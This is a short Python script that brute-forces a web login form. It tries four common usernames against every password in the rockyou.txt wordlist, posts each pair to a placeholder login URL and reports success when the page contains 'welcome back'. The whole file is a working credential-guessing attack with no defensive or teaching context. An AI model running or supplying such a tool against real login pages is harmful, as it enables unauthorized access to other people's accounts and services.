import requests
import sys

target = "http://example.com/login"  # Update this with the actual target URL
usernames = ["admin", "user", "test", "root"]
passwords = "/usr/share/wordlists/rockyou.txt" #if you want to use any other password list simply copy the txt file in the folder and replace everything is these quotation with the file name
needle = 'welcome back'

for username in usernames:
    with open(passwords, "r") as passwords_list:
        for password in passwords_list:
            password = password.strip("\n").encode()
            sys.stdout.write("[X] Attempting username:password -> {}:{}\r".format(username, password.decode()))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password.decode()})
            if needle.encode() in r.content:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password.decode(), username))
                sys.exit()
        sys.stdout.flush()
        sys.stdout.write("\n")
        sys.stdout.write("\tNo password found for the user '{}'\n".format(username))
